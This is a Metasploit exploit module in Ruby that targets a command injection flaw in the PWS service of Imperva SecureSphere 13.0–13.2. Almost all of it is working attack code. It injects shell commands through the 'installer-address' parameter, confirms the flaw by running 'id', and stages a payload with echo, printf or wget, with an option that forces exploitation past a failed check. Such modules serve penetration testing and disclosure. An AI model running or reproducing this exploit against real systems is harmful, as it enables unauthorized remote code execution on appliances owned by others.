# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;           => &#039;Imperva SecureSphere PWS Command Injection&#039;,
        &#039;Description&#039;    => %q(
          This module exploits a command injection vulnerability in Imperva
          SecureSphere 13.x. The vulnerability exists in the PWS service,
          where Python CGIs didn&#039;t properly sanitize user supplied command
          parameters and directly passes them to corresponding CLI utility,
          leading to command injection. Agent registration credential is
          required to exploit SecureSphere in gateway mode.

          This module was successfully tested on Imperva SecureSphere 13.0/13.1/
        ),
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         =>
          [
            &#039;rsp3ar <lukunming<at>gmail.com>&#039; # Discovery/Metasploit Module
          ],
        &#039;References&#039;     =>
          [
            [ &#039;EDB&#039;, &#039;45542&#039; ]
          ],
        &#039;DisclosureDate&#039;  => "Oct 8 2018",
        &#039;DefaultOptions&#039; => {
          &#039;SSL&#039; => true,
          &#039;PrependFork&#039; => true,
        },
        &#039;Platform&#039;        => &#039;linux&#039;,
        &#039;Arch&#039;            => [ARCH_X86, ARCH_X64],
        &#039;CmdStagerFlavor&#039; => %w{ echo printf wget },
        &#039;Targets&#039;         =>
          [
            [&#039;Imperva SecureSphere 13.0/13.1/13.2&#039;, {}]
          ],
        &#039;DefaultTarget&#039;   => 0))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new(&#039;USERNAME&#039;, [false, &#039;Agent registration username&#039;, &#039;imperva&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [false, &#039;Agent registration password&#039;, &#039;&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [false, &#039;The URI path to impcli&#039;, &#039;/pws/impcli&#039;]),
        OptInt.new(&#039;TIMEOUT&#039;, [false, &#039;HTTP connection timeout&#039;, 15])
      ])
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;,  [false, &#039;Override check result&#039;, false])
    ]
  end

  def check
    begin
      res = execute_command(&#039;id&#039;)
    rescue => e
      vprint_error("#{e}")
      return CheckCode::Unknown
    end

    if res.body =~ /uid=\d+/
      return CheckCode::Vulnerable
    end

    CheckCode::Safe
  end

  def exploit
    unless CheckCode::Vulnerable == check
      unless datastore[&#039;ForceExploit&#039;]
        fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;)
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    print_status("Sending payload #{datastore[&#039;PAYLOAD&#039;]}")
    execute_cmdstager
  end

  def execute_command(cmd, opts = {})
    data = {
      &#039;command&#039;     => &#039;impctl server status&#039;,
      &#039;parameters&#039;  => {
        &#039;broadcast&#039;         => true,
        &#039;installer-address&#039; => "127.0.0.1 $(#{cmd})"
      }
    }

    res = send_request data

    return unless res

    if res.code == 401
      fail_with(Failure::NoAccess, &#039;Authorization Failure, valid agent registration credential is required&#039;)
    end

    unless res.code == 406 && res.body.include?("impctl")
      fail_with(Failure::Unknown, &#039;Server did not respond in an expected way&#039;)
    end

    res
  end

  def send_request(data)
    req_params = {
      &#039;method&#039;      => &#039;POST&#039;,
      &#039;uri&#039;         => normalize_uri(target_uri.path),
      &#039;data&#039;        => data.to_json
    }

    if !datastore[&#039;USERNAME&#039;].blank? && !datastore[&#039;PASSWORD&#039;].blank?
      unless @cookie
        res = send_request_cgi({
          &#039;method&#039;      => &#039;GET&#039;,
          &#039;uri&#039;         => normalize_uri(&#039;/&#039;)
        })
        unless res
          fail_with(Failure::Unreachable, "#{peer} - Connection failed")
        end

        @cookie = res.get_cookies
      end

      req_params[&#039;cookie&#039;] = @cookie
      req_params[&#039;headers&#039;] = {
        &#039;Authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
      }
    end

    send_request_cgi(req_params, datastore[&#039;TIMEOUT&#039;])
  end
end

